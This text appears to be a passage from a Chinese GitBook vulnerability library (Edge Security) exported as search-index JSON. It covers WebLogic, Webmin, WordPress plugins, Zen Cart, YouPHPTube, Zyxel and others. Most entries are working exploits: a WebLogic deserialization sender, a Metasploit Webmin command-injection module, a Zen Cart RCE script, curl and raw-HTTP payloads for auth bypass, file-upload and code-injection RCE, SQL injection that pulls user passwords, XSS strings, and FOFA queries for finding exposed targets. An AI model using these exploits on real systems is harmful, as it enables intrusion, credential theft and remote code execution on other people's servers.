6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x05\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x00\\xff\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x46\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\x00\\x0b\\x75\\x73\\x2d\\x6c\\x2d\\x62\\x72\\x65\\x65\\x6e\\x73\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x07\\x00\\x00\\x1b\\x59\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x78\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x1d\\x01\\x81\\x40\\x12\\x81\\x34\\xbf\\x42\\x76\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x00\\x00\\x78' # adjust header for appropriate message length payload=struct.pack('>I',len(payload)) + payload[4:] print '[+] Sending payload...' sock.send(payload) data = sock.recv(1024) print >>sys.stderr, 'received \"%s\"' % data from:https://y4er.com/post/weblogic-cve-2020-14756/ ref： https://www.oracle.com/security-alerts/cpujan2021.html#AppendixFMW https://y4er.com/post/weblogic-cve-2020-14756/ https://github.com/Y4er/CVE-2020-14756 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Webmin <=1.962 任意命令执行（CVE-2020-35606）.html":{"url":"Edge_Security/Webmin <=1.962 任意命令执行（CVE-2020-35606）.html","title":"Webmin <=1.962 任意命令执行（CVE-2020-35606）","keywords":"","body":"Webmin 此漏洞绕过了CVE-2019-12840的补丁，参考：https://github.com/webmin/webmin/commit/e122629c02e2bae8f06f2ce0c3f0bd7bb7ffc3f5#diff-adc54486ea3dd9ca0ec430f0fe8fec964e95ed42bd7a7adfaf26db43e9682d50 在Payload的末尾（％26％26）加上双＆符（&&）进行绕过。 fofa: app=\"webmin\" Webmin 1.962-PU Escape Bypass-远程命令执行 Metasploit模块： ## ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule 'Webmin 1.962 - PU Escape Bypass - Remote Command Execution', 'Description' => %q( This module exploits an arbitrary command execution vulnerability in Webmin 1.962 and lower versions. Any user authorized to the \"Package Updates\" module can execute arbitrary commands with root privileges. It emerged by circumventing the measure taken for CVE-2019-12840. s/\\\\(-)|\\\\(.)/string/g; escape is not enough for prevention. Therefore, since the package name variable is placed directly in the system command, we can manipulate it using some escape characters that HTTP supports. For example, we can escape control by dropping the command line down one line. We can do this with \"%0A\" and \"%0C\" urlencoded row values.Also, for paylad to work correctly, we must add double an ampersand(&&) to the end of the payload (%26%26) ), 'Author' => [ 'AkkuS ' # Vulnerability Discovery, MSF PoC module ], 'License' => MSF_LICENSE, 'References' => [ ['CVE', '2020-'], ['URL', 'https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape-Bypass-Remote-Command-Execution.html'] ], 'Privileged' => true, 'Payload' => { 'DisableNops' => true, 'Space' => 512, 'Compat' => { 'PayloadType' => 'cmd' } }, 'DefaultOptions' => { 'RPORT' => 10000, 'SSL' => false, 'PAYLOAD' => 'cmd/unix/reverse_perl' }, 'Platform' => 'unix', 'Arch' => ARCH_CMD, 'Targets' => [['Webmin '2020-12-21', 'DefaultTarget' => 0) ) register_options [ OptString.new('USERNAME', [true, 'Webmin Username']), OptString.new('PASSWORD', [true, 'Webmin Password']), OptString.new('TARGETURI', [true, 'Base path for Webmin application', '/']) ] end def peer \"#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}\" end def login res = send_request_cgi({ 'method' => 'POST', 'uri' => normalize_uri(target_uri, 'session_login.cgi'), 'cookie' => 'testing=1', # it must be used for \"Error - No cookies\" 'vars_post' => { 'page' => '', 'user' => datastore['USERNAME'], 'pass' => datastore['PASSWORD'] } }) if res && res.code == 302 && res.get_cookies =~ /sid=(\\w+)/ return $1 end return nil unless res '' end def check cookie = login return CheckCode::Detected if cookie == '' return CheckCode::Unknown if cookie.nil? vprint_status('Attempting to execute...') # check version res = send_request_cgi({ 'method' => 'GET', 'uri' => normalize_uri(target_uri.path, \"sysinfo.cgi\"), 'cookie' => \"sid=#{cookie}\", 'vars_get' => { \"xnavigation\" => \"1\" } }) if res && res.code == 302 && res.body version = res.body.split(\"Webmin 1.\")[1] return CheckCode::Detected if version.nil? version = version.split(\" \")[0] if version normalize_uri(target_uri.path, \"package-updates/\"), 'cookie' => \"sid=#{cookie}\" }) if res && res.code == 200 && res.body =~ /Software Package Update/ print_status(\"NICE! #{datastore['USERNAME']} has the right to >>Package Update>Package Update 'POST', 'uri' => normalize_uri(target_uri, 'proc', 'index_tree.cgi'), 'headers' => { 'Referer' => \"#{peer}/sysinfo.cgi?xnavigation=1\" }, 'cookie' => \"sid=#{cookie}\" ) unless res && res.code == 200 fail_with(Failure::Unknown, 'Request failed') end print_status(\"Attempting to execute the payload...\") run_update(cookie) end def run_update(cookie) @b64p = Rex::Text.encode_base64(payload.encoded) perl_payload = 'bash -c \"{echo,' + \"#{@b64p}\" + '}|{base64,-d}|{bash,-i}\"' payload = Rex::Text.uri_encode(perl_payload) res = send_request_cgi( { 'method' => 'POST', 'cookie' => \"sid=#{cookie}\", 'ctype' => 'application/x-www-form-urlencoded', 'uri' => normalize_uri(target_uri.path, 'package-updates', 'update.cgi'), 'headers' => { 'Referer' => \"#{peer}/package-updates/?xnavigation=1\" }, # new vector // bypass to backslash %0A%7C{}%26%26 'data' => \"redir=%2E%2E%2Fsquid%2F&redirdesc=Squid%20Proxy%20Server&mode=new&u=squid34%0A%7C#{payload}%26%26\" # for CVE-2019-12840 #'data' => \"u=acl%2Fapt&u=%20%7C%20#{payload}&ok_top=Update+Selected+Packages\" }) end end ref: https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape-Bypass-Remote-Command-Execution.html https://github.com/webmin/webmin/commit/e122629c02e2bae8f06f2ce0c3f0bd7bb7ffc3f5#diff-adc54486ea3dd9ca0ec430f0fe8fec964e95ed42bd7a7adfaf26db43e9682d50 https://nvd.nist.gov/vuln/detail/CVE-2020-35606 https://forum.ywhack.com/thread-114860-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Webmin 多个高危漏洞（CVE-2021-31760~62）.html":{"url":"Edge_Security/Webmin 多个高危漏洞（CVE-2021-31760~62）.html","title":"Webmin 多个高危漏洞（CVE-2021-31760~62）","keywords":"","body":"Webmin 多个高危漏洞（CVE-2021-31760~62） CVE-2021-31760:利用CSRF攻击，实现对Webmin的远程命令执行。 CVE-2021-31761:利用XSS攻击，实现对Webmin的远程命令执行。 CVE-2021-31762:利用CSRF攻击，通过Webmin的添加用户功能创建特权用户，然后通过特权用户权限反弹shell。 FOFA:app=\"Webmin\" 影响版本：Webmin PoC： CVE-2021-31760： https://github.com/electronicbots/CVE-2021-31760 CVE-2021-31761： https://github.com/electronicbots/CVE-2021-31761 CVE-2021-31762： https://github.com/electronicbots/CVE-2021-31762 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Windows Installer File Read 0day.html":{"url":"Edge_Security/Windows Installer File Read 0day.html","title":"Windows Installer File Read 0 Day","keywords":"","body":"Windows Installer File Read 0day PoC: https://github.com/klinix5/Windows_Installer_File_Read 详情：https://halove23.blogspot.com/2021/02/windows-installer-file-read-0day_12.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Windows容器管理器服务提升权限漏洞（CVE-2021-31169）.html":{"url":"Edge_Security/Windows容器管理器服务提升权限漏洞（CVE-2021-31169）.html","title":"Windows容器管理器服务提升权限漏洞（CVE-2021-31169）","keywords":"","body":"Windows容器管理器服务提升权限漏洞（CVE-2021-31169） 容器管理器服务在不模拟导致EoP的访问令牌的情况下创建AppContainer进程。容器管理器服务用于Windows Sandbox和Microsoft Defender Application Guard创建轻量级VM。它公开了一个ACLed的RPC服务，允许每个人都可以调用它。这与VM计算服务或Hyper-V本身形成鲜明对比，后者需要成为Hyper-V Administrators组的成员，根据服务标准，该组被视为不在范围之内。 poc：https://packetstormsecurity.com/files/162557/Windows-Container-Manager-Service-Arbitrary-Object-Directory-Creation-Privilege-Escalation.html 1）编译C#项目。需要获取NuGet库。包含.NET 5和.NET 4.71版本。 2）在系统上安装Microsoft Defender Application Guard或Windows沙盒，然后重新启动。 3）以任何用户帐户运行POC。 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/WordPress 5.6-5.7-经过身份验证的XXE（CVE-2021-29447）.html":{"url":"Edge_Security/WordPress 5.6-5.7-经过身份验证的XXE（CVE-2021-29447）.html","title":"WordPress 5.6-5.7-经过身份验证的XXE（CVE-2021-29447）","keywords":"","body":"WordPress 5.6-5.7-经过身份验证的XXE（CVE-2021-29447） 能够上传文件的用户（例如Author）可以利用媒体库中的XML解析问题来导致XXE攻击。WordPress使用了一个名为ID3的MP3解析库，该库受到XML外部实体（XXE）漏洞的影响，该漏洞会影响PHP 8及更高版本。 PoC： \" > decryption.php： 参考：https://github.com/motikan2010/CVE-2021-29447 ref： https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5 https://core.trac.wordpress.org/changeset/29378 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/WordPress Elementor Page Builder Plus插件身份验证绕过（CVE-2021-24175）.html":{"url":"Edge_Security/WordPress Elementor Page Builder Plus插件身份验证绕过（CVE-2021-24175）.html","title":"WordPress Elementor Page Builder Plus插件身份验证绕过（CVE-2021-24175）","keywords":"","body":"WordPress Elementor Page Builder Plus插件身份验证绕过（CVE-2021-24175） 未经身份验证的用户可以使用\"theplus_ajax_login\"和\"theplus_google_ajax_register\" Ajax请求，通过仅提供相关的用户名，就可以像任何用户一样轻松地进行身份验证。 影响版本： Elementor Page Builder PoC： curl -X POST --data action=theplus_ajax_login --data email=admin -iLSS https://example.com/wp-admin/admin-ajax.php curl -X POST --data action=theplus_google_ajax_register --data email=admin --data nonce=a -iLSS https://example.com/wp-admin/admin-ajax.php \"theplus_google_ajax_register\" AJAX请求还可以允许任何未经身份验证的用户创建具有任意角色的帐户，例如admin，然后登录。 html： ref： https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24175 https://wpscan.com/vulnerability/c311feef-7041-4c21-9525-132b9bd32f89 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/WordPress File Manager ＜ 6.9 RCE（CVE-2020-25213）PoC.html":{"url":"Edge_Security/WordPress File Manager ＜ 6.9 RCE（CVE-2020-25213）PoC.html","title":"WordPress File Manager ＜ 6.9 RCE（CVE-2020-25213）PoC","keywords":"","body":"WordPress File Manager ＜ 6.9 RCE（CVE-2020-25213）PoC [Proof Of Concept] curl -ks --max-time 5 -F \"reqid=17457a1fe6959\" -F \"cmd=upload\" -F \"target=l1_Lw\" -F \"mtime[]=1576045135\" -F \"upload[]=@/$file_upload\" \"hxxps://victim.com/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\" POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1 Content-Length: 631 Content-Type: multipart/form-data; boundary=------------------------9689147a5989a801 Connection: close --------------------------9689147a5989a801 Content-Disposition: form-data; name=\"reqid\" 17457a1fe6959 --------------------------9689147a5989a801 Content-Disposition: form-data; name=\"cmd\" upload --------------------------9689147a5989a801 Content-Disposition: form-data; name=\"target\" l1_Lw --------------------------9689147a5989a801 Content-Disposition: form-data; name=\"mtime[]\" 1576045135 --------------------------9689147a5989a801 Content-Disposition: form-data; name=\"upload[]\"; filename=\"1.php\" Content-Type: application/octet-stream --------------------------9689147a5989a801-- ref： https://forum.ywhack.com/thread-1645-1-7.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/WordPress GiveWP 2.9.7 反射型XSS（CVE-2021-24213）.html":{"url":"Edge_Security/WordPress GiveWP 2.9.7 反射型XSS（CVE-2021-24213）.html","title":"WordPress GiveWP 2.9.7 反射型XSS（CVE-2021-24213）","keywords":"","body":"WordPress GiveWP 2.9.7 反射型XSS（CVE-2021-24213） GiveWP 是WordPress的捐赠插件，由于过滤不严导致反射型XSS漏洞. poc： http://localhost/wp-admin/edit.php?s=%22%3Ealert(0)&start-date&end-date&form_id=0&action=-1&paged=1&give_action=delete_bulk_donor&orderby=id&order=DESC&action2=-1&post_type=give_forms&page=give-donors&view=donors ref： https://0day.today/exploit/36018 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/WordPress WP Super Cache 插件 < 1.7.2 RCE（CVE-2021-24209）.html":{"url":"Edge_Security/WordPress WP Super Cache 插件 < 1.7.2 RCE（CVE-2021-24209）.html","title":"WordPress WP Super Cache 插件 < 1.7.2 RCE（CVE-2021-24209）","keywords":"","body":"WordPress WP Super Cache 插件 WP Super Cache Settings -> Cache Location option选项中的$cache_path过滤不严，导致该插件在设置页面中受身份验证（admin+）RCE的影响。 PoC： POST /wp-admin/options-general.php?page=wpsupercache&tab=settings HTTP/1.1 User-Agent: Mozilla/5.0 Content-Type: application/x-www-form-urlencoded Content-Length: 501 Cookie: [admin cookies] _wpnonce=88a432b100&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dwpsupercache%26tab%3Dsettings&action=scupdates&wp_cache_enabled=1&wp_cache_mod_rewrite=0&wp_cache_not_logged_in=2&cache_rebuild_files=1&wp_cache_location=%2Fvar%2Fwww%2Fyour%2Fown%2Fpath%2Fexample.com%2Fwp-content%2Fcache%2F%27%3Bsystem%28%24_GET%5B13%5D%29%3Binclude_once+%5C%27wp-cache-config.php%5C%27%3B%27&_wpnonce=88a432b100&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dwpsupercache%26tab%3Dsettings payload: ';system($_GET[13]);include_once \\'wp-cache-config.php\\';' ';`$_GET[13]`;include_once \\'wp-cache-config.php\\';?>ref： https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2021-24209 https://wpscan.com/vulnerability/733d8a02-0d44-4b78-bbb2-37e447acd2f3 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/WordPress 插件SuperForms 4.9-任意文件上传到远程代码执行.html":{"url":"Edge_Security/WordPress 插件SuperForms 4.9-任意文件上传到远程代码执行.html","title":"WordPress 插件SuperForms 4.9-任意文件上传到远程代码执行","keywords":"","body":"WordPress 插件SuperForms 4.9-任意文件上传到远程代码执行 官方：https://renstillmann.github.io/super-forms/#/ Google Dork : inurl:\"/wp-content/plugins/super-forms/\" 受影响版本： All ( PoC： POST /wp-content/plugins/super-forms/uploads/php/ HTTP/1.1 /filename.php4 u can get from server reply . from：https://www.exploit-db.com/exploits/49490 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/WordPress插件Tutor LMS SQL注入漏洞（CVE-2021-24186）.html":{"url":"Edge_Security/WordPress插件Tutor LMS SQL注入漏洞（CVE-2021-24186）.html","title":"WordPress插件Tutor LMS SQL注入漏洞（CVE-2021-24186）","keywords":"","body":"WordPress插件Tutor LMS SQL注入漏洞（CVE-2021-24186） Tutor LMS – eLearning and online course solution是WordPress的一个插件，可以创建具有挑战性和趣味性的测验，互动课程，功能强大的报告和统计信息。Tutor LMS – eLearning and online course solution 影响版本： Tutor LMS – eLearning and online course solution PoC： POST /courses/first-class/tutor_quiz/test/ HTTP/1.1 Host: [URL] Content-Length: 413 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: [URL] Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: [URL] Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: [COOKIES] Connection: close _wpnonce=[REPLACE_WITH_VALID_NONCE]&_wp_http_referer=%2Fcourses%2Ffirst-class%2Ftutor_quiz%2Ftest%2F&attempt_id=1&tutor_action=tutor_answering_quiz_question&attempt%5B1%5D%5Bquiz_question_ids%5D%5B%5D=&attempt%5B1%5D%5Bquiz_question%5D%5B1%5D=1 UNION select 1,2,3,version(),5,6,7,8,9,10.11,12,13;--&attempt%5B1%5D%5Bquiz_question_ids%5D%5B%5D=2&attempt%5B1%5D%5Bquiz_question%5D%5B2%5D=5&quiz_answer_submit_btn=quiz_answer_submit Then send a GET request to http://[URL]/dashboard/my-quiz-attempts/attempts-details/?attempt_id=1 ref: https://nvd.nist.gov/vuln/detail/CVE-2021-24186 https://mp.weixin.qq.com/s/WdaOrEf7l7H0URhDyXjPpw https://wpscan.com/vulnerability/5f5c0c6c-6f76-4366-b590-0aab557f8c60 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Xmind 2020 XSS漏洞导致命令执行.html":{"url":"Edge_Security/Xmind 2020 XSS漏洞导致命令执行.html","title":"Xmind 2020 XSS漏洞导致命令执行","keywords":"","body":"Xmind 2020 XSS漏洞导致命令执行 XMind是一种功能齐全的思维导图和头脑风暴工具，旨在产生想法，激发创造力，并在工作和生活中带来效率。数以百万计的用户们喜欢它。Xmind 2020存在XSS漏洞，攻击者可以借助该漏洞实现命令执行，在实际环境中借助钓鱼攻击可能造成更严重的危害。 该软件允许以文件形式或自定义标题的形式存储Payload，一旦输入恶意代码，当受害者移动鼠标或单击时，Payload将被执行。 poc见：https://sploitus.com/exploit?id=EDB-ID:49827 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/XStream 1.4.16 多个RCE（CVE-2021-21344~50）.html":{"url":"Edge_Security/XStream 1.4.16 多个RCE（CVE-2021-21344~50）.html","title":"XStream 1.4.16 多个RCE（CVE-2021-21344~50）","keywords":"","body":"XStream 1.4.16 多个RCE（CVE-2021-21344~50） CVE-2021-21344 XStream 任意代码执行 CVE-2021-21345 XStream 远程命令执行 CVE-2021-21346 XStream 任意代码执行 CVE-2021-21347 XStream 任意代码执行 CVE-2021-21348 XStream ReDos CVE-2021-21349 XStream CSRF CVE-2021-21350 XStream 任意代码执行 详情可以看：http://x-stream.github.io/security.html PoC官网都有。 XStreamhttps://mp.weixin.qq.com/s/qNNI3GIy71Z3b7TZiH49Gw Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/xxl-job 执行器 RESTful API 未授权访问 RCE.html":{"url":"Edge_Security/xxl-job 执行器 RESTful API 未授权访问 RCE.html","title":"xxl-job 执行器 RESTful API 未授权访问 RCE","keywords":"","body":"xxl-job 执行器 RESTful API 未授权访问 RCE PoC： 以restful API 来看，看官方文档 xxl-job/XXL-JOB官方文档.md ，在没有access token的情况下 ，可以直接触发任务 POST {执行器内嵌服务跟地址}/run { \"jobId\":1, // 任务ID \"executorHandler\":\"demoJobHandler\", // 任务标识 \"executorParams\":\"demoJobHandler\", // 任务参数 \"executorBlockStrategy\":\"COVER_EARLY\", // 任务阻塞策略，可选值参考 com.xxl.job.core.enums.ExecutorBlockStrategyEnum \"executorTimeout\":0, // 任务超时时间，单位秒，大于零时生效 \"logId\":1, // 本次调度日志ID \"logDateTime\":1586629003729, // 本次调度日志时间 \"glueType\":\"BEAN\", // 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum \"glueSource\":\"xxx\", // GLUE脚本代码 \"glueUpdatetime\":1586629003727, // GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新 \"broadcastIndex\":0, // 分片参数：当前分片 \"broadcastTotal\":0 // 分片参数：总分片 } jas502n：https://github.com/jas502n/xxl-job https://forum.ywhack.com/thread-114622-1-5.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/YouPHPTube <= 10.0 and 7.8 多个漏洞 SQL注入、XSS、文件写入.html":{"url":"Edge_Security/YouPHPTube <= 10.0 and 7.8 多个漏洞 SQL注入、XSS、文件写入.html","title":"YouPHPTube <= 10.0 and 7.8 多个漏洞 SQL注入、XSS、文件写入","keywords":"","body":"YouPHPTube YouPHPTube是一个开源的视频共享网站应用。使用YouPHPTube，用户可以创建自己的视频共享网站，YouPHPTube 将帮助用户导入和编码来自Youtube，Vimeo 等其他网站的视频，用户可以直接在自己的网站上进行分享。 除了XSS 其它都需要进行身份验证...文件写入需要管理员权限.. FOFA： app=\"AVideo-YouPHPTube\" 1.sql注入： 漏洞代码： $sql .= \" AND (c.clean_name = '{$_GET['catName']}' OR c.parentId IN (SELECT cs.id from categories cs where cs.clean_name = '{$_GET['catName']}' ))\"; PoC： GET /feed/?catName=%5c HTTP/1.1 [...] 10.0版本： GET /feed/?catName=) +UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 ,30,31, (select+password+from+users+limit+0,1),33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,5 0,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78%23%5c 3/6 HTTP/1.1 [...] HTTP/1.1 200 OK […] 756b4b2b734f5568096daf16516975d7 […] 7.8版本： GET /youphptube/YouPHPTube-master/feed/?catName=) +UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 ,30, (select+password+from+users+limit+0,1),32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,4 9,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73%23%5c HTTP/1.1 […] HTTP/1.1 200 OK […] 756b4b2b734f5568096daf16516975d7 […] 2.XSS跨站脚本 漏洞代码： print isset($_GET['redirectUri']) ? $_GET['redirectUri'] : \"\"; PoC： http:///signUp?redirectUri=%22%3E%3Cscript%3Ealert(111)%3C%2fscript%3E http:///plugin/Live/?u=%3Cscript%3Ealert(66)%3C%2fscript%3E 3.文件写入导致的代码执行： 漏洞代码： $file = $dir.strtolower($_POST['flag']).\".php\"; $myfile = fopen($file, \"w\") or die(\"Unable to open file!\"); if (!$myfile) { $obj->status = 0; $obj->error = __(\"Unable to open file!\"); die(json_encode($obj)); } $txt = \" PoC： $ curl -kis 'http:///locale/save.php' -H 'Cookie:09b9117edc20bc1c555739155c0eb1bd=9jpn05830lp2f7s9atqbs9kbc1;' --data 'flag=testfile2&code=system(id);' $ curl -kis 'http:///locale/testfile2.php' -H 'Cookie:09b9117edc20bc1c555739155c0eb1bd=9jpn05830lp2f7s9atqbs9kbc1;' HTTP/1.1 200 OK Date: Sat, 21 Nov 2020 05:20:55 GMT Server: Apache X-Powered-By: PHP/7.4.11 Cache-Control: max-age=1, private, must-revalidate Expires: Sat, 21 Nov 2020 05:20:56 GMT Content-Length: 49 Content-Type: text/html; charset=UTF-8 uid=81(apache) gid=81(apache) groupes=81(apache) ref: https://www.synacktiv.com/sites/default/files/2021-01/YouPHPTube_Multiple_Vulnerabilities.pdf https://forum.ywhack.com/thread-115063-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/yycms首页搜索框 XSS漏洞.html":{"url":"Edge_Security/yycms首页搜索框 XSS漏洞.html","title":"yycms首页搜索框 XSS漏洞","keywords":"","body":"yycms首页搜索框 XSS漏洞 FOFA: body=\"templets/yycms/css/\" PoC： alert(/xss/) ref： https://forum.ywhack.com/thread-114996-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Zen Cart 1.5.7b 任意命令执行（CVE-2021-3291）.html":{"url":"Edge_Security/Zen Cart 1.5.7b 任意命令执行（CVE-2021-3291）.html","title":"Zen Cart 1.5.7b 任意命令执行（CVE-2021-3291）","keywords":"","body":"Zen Cart 1.5.7b 任意命令执行（CVE-2021-3291） Zen Cart 1.5.7b 管理员通过检查HTML radiobox元素（在模块编辑页面内），通过插入命令来执行任意命令。 1-）以管理员身份登录 2-）获取任何模块编辑页面 3-）检查元素任何真实的单选框 4-）将true更改为true','MODULE_ORDER_TOTAL_TOTAL_STATUS'); echo id; // 5-）点击更新 6-）触发命令再次进入编辑页面 CVE-2021-3291 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3291 zencart_v157b_authenticated_rce_exploit.py: #!/usr/bin/python3 import mechanize as mc import sys import re from bs4 import BeautifulSoup as bs import base64 as B try: url = sys.argv[1] assert url[-1] == \"/\" username = sys.argv[2] password = sys.argv[3] com = sys.argv[4] except: print (\"Usage: {sys.argv[0]} http://target.com/zencart/crackXXXXX/ username password command\") exit(1) moduls = [\"payment\",\"shipping\",\"ordertotal\",\"plugin_manager\"] # default br = mc.Browser() br.set_handle_robots(False) br.addheaders=[('User-agent','Chrome')] br.open(url+\"login.php\") br.select_form(\"loginForm\") br.form[\"admin_name\"] = username br.form[\"admin_pass\"] = password send = br.submit() mod = moduls[0] adres = url+\"index.php?cmd=modules&set=\"+mod kaynak = br.open(adres).read() adr = re.findall(b'Edit\" in kaynak: print (f\"Target url: {ek}&action=edit\") br.open(ek+\"&action=edit\") br.select_form(\"modules\") form = br.forms()[0] liste = b\"\" for con in form.controls: try: deger = br.form.find_control(name=con.name).value boyut = len(deger) if type(deger) == list: if boyut == 0 or deger[0] == \"True\" or deger[0] == \"False\": liste += con.name.encode() + b\"=\" + f\"True','F'); echo `/bin/bash -c '{com}'`; //\".encode() + b\"&\" print(\"Payload injected\") else: liste += con.name.encode() + b\"=\" + deger[0].encode() + b\"&\" else: liste += con.name.encode() + b\"=\" + deger.encode() + b\"&\" except: pass print (liste[:-1]) #br.set_proxies({\"http\": \"localhost:5555\"}) ac = br.open(ek+\"&action=save\", liste[:-1]) son = br.open(ek+\"&action=edit\") son = br.open(ek+\"&action=edit\") son = br.open(ek+\"&action=edit\") break from：https://github.com/MucahitSaratar/zencart_auth_rce_poc Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Zyxel NBG2105 身份验证绕过（CVE-2021-3297）.html":{"url":"Edge_Security/Zyxel NBG2105 身份验证绕过（CVE-2021-3297）.html","title":"Zyxel NBG2105 身份验证绕过（CVE-2021-3297）","keywords":"","body":"Zyxel NBG2105 身份验证绕过（CVE-2021-3297） FOFA： app=\"ZyXEL-NBG2105\" 漏洞代码： http://target/js/util_gw.js PoC： Cookie: login=1; 只需要将cookie中login=0 修改为login=1即可直接进入管理界面。 ref： https://forum.ywhack.com/thread-115035-1-1.html https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Zyxel USG Series 账户硬编码漏洞（CVE-2020-29583）.html":{"url":"Edge_Security/Zyxel USG Series 账户硬编码漏洞（CVE-2020-29583）.html","title":"Zyxel USG Series 账户硬编码漏洞（CVE-2020-29583）","keywords":"","body":"Zyxel USG Series 账户硬编码漏洞（CVE-2020-29583） FOFA: title=\"USG40\" Username: zyfwp Password: 